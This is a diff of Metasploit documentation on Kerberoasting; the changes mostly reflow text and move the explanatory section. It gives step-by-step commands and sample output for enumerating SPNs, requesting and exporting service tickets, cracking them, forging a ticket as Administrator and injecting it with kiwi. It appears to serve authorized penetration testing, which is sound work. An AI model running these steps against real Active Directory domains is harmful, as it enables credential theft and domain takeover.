@@ -1,10 +1,3 @@
-
-## Kerberoasting
-
-Kerberoasting is a post-exploitation technique that tries to crack the password of a service acount withtin Active Directory. The attacker requests a ticket while pretending to be an account user with a service principal name (SPN), which contains an encrypted password. Once recieved, the attacker attemps to crack the password hash. 
-
-If successful, the attacker possess user credentials that can be used to impersonate the account owner. Now the attacker appears to be an approved and legitimate user and has unrestricted access to any assets, systems or networks granted to the compromised account, boom roasted.
-
 ## Vulnerable Application
 
 Any system leveraging kerberos as a means of authentication e.g. Active Directory, MSSQL
@@ -12,7 +5,7 @@ Any system leveraging kerberos as a means of authentication e.g. Active Director
 ## Verification Steps
 
 1. Start msfconsole
-3. Obtain SPNs from your target 
+3. Obtain SPNs from your target
 	1. Do: `use auxiliary/gather/ldap_query`
 	2. Do: `set action ENUM_USER_SPNS_KERBEROAST`
 	3. Run the module and note the discovered SPNs
@@ -24,16 +17,27 @@ Any system leveraging kerberos as a means of authentication e.g. Active Director
 6. Crack the encryped password in the service ticket using tgsrepcrack.py (more info on this python script below)
 	1. Do:  `python3 tgsrepcrack.py passlist.txt 1-40a10000-Administrator@HTTP\~testService-EXAMPLE.COM.kirbi`
 7. Rewrite the service tickets using kerberoast.py (more info on this python script below)
-	1. Do:  `python3  kerberoast.py -p N0tpassword! -r 1-40a10000-Administrator@HTTP~testService-EXAMPLE.COM.kirbi -w Administrator.kirbi -u 500`
+	1. Do:  `python3  kerberoast.py -p N0tpassword!
+	    -r 1-40a10000-Administrator@HTTP~testService-EXAMPLE.COM.kirbi -w Administrator.kirbi -u 500`
 8. Finally inject the ticket back into RAM using meterpreter's kiwi extension
 	1. `meterpreter > kiwi_cmd kerberos::ptt Administrator.kirbi`
-	   
 
-## Scenario
+## Kerberoasting
+
+Kerberoasting is a post-exploitation technique that tries to crack the password of a service acount withtin Active
+Directory. The attacker requests a ticket while pretending to be an account user with a service principal name (SPN),
+which contains an encrypted password. Once recieved, the attacker attemps to crack the password hash.
+
+If successful, the attacker possess user credentials that can be used to impersonate the account owner. Now the attacker
+appears to be an approved and legitimate user and has unrestricted access to any assets, systems or networks granted
+to the compromised account, boom roasted.
+
+## Scenarios
 
 ### SPN Discovery
 
-First an SPN needs to be found. This can be done in a number of ways including using metasploit's very own ldap_query module :
+First an SPN needs to be found. This can be done in a number of ways including using metasploit's
+very own ldap_query module :
 
 ```
 msf6 > use auxiliary/gather/ldap_query
@@ -91,7 +95,7 @@ CN=LESSIE_PHILLIPS OU=Test OU=GOO OU=Stage DC=example DC=com
 
 Great, we now have a couple SPNs to move forward with.
 
-### Request Service Tickets 
+### Request Service Tickets
 
 We can request a Service Ticket using the kiwi extension in metasploit and one of the SPNs found above:
 ```
@@ -121,7 +125,7 @@ Asking for: https/TSTWLPT1000000
 
 ```
 
-Tickets in the current session can be viewed like so: 
+Tickets in the current session can be viewed like so:
 ```
 
 meterpreter > kerberos_ticket_list
@@ -138,7 +142,6 @@ meterpreter > kerberos_ticket_list
    Client Name       : Administrator @ EXAMPLE.COM
    Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
 ```
-
 
 ### Export Service Tickets
 ```
@@ -192,9 +195,10 @@ MDAwMA==
 ```
 
 
-### Crack Service Tickets 
+### Crack Service Tickets
 
-To crack the service ticket a number of tools can be used. In this example we'll use a python script **tgsrepcrack** is part of [Tim Medin](https://twitter.com/TimMedin) [Kerberoast](https://github.com/nidem/kerberoast) toolkit
+To crack the service ticket a number of tools can be used. In this example we'll use a python
+script **tgsrepcrack** is part of [Tim Medin](https://twitter.com/TimMedin) [Kerberoast](https://github.com/nidem/kerberoast) toolkit
 
 ```
 ➜  kerberoast git:(master) ✗ python3 tgsrepcrack.py passlist.txt 1-40a10000-Administrator@HTTP\~testService-EXAMPLE.COM.kirbi
@@ -205,20 +209,19 @@ Successfully cracked all tickets
 
 ### Rewrite Service Tickets & RAM Injection
 
-Kerberos tickets are signed with the NTLM hash of the password. If the ticket hash has been cracked then it is possible to  rewrite the ticket with [Kerberoast](https://github.com/nidem/kerberoast) python script. This tactic will allow to impersonate any domain user or a fake account when the service is going to be accessed. Additionally privilege escalation is also possible as the user can be added into an elevated group such as Domain Admins.
+Kerberos tickets are signed with the NTLM hash of the password. If the ticket hash has been cracked then it is possible
+to rewrite the ticket with [Kerberoast](https://github.com/nidem/kerberoast) python script. This tactic will allow to
+impersonate any domain user or a fake account when the service is going to be accessed. Additionally privilege
+escalation is also possible as the user can be added into an elevated group such as Domain Admins.
 
 ```
 ➜  kerberoast git:(master) ✗ python3  kerberoast.py -p N0tpassword! -r 1-40a10000-Administrator@HTTP~testService-EXAMPLE.COM.kirbi -w Administrator.kirbi -u 500
 ```
 
 
-The new ticket can be injected back into the memory with the following Mimikatz command in order to perform authentication with the targeted service via Kerberos protocol.
+The new ticket can be injected back into the memory with the following Mimikatz command in order to perform
+authentication with the targeted service via Kerberos protocol.
 
 ```
 meterpreter > kiwi_cmd kerberos::ptt Administrator.kirbi
 ```
-
-
-
-
-
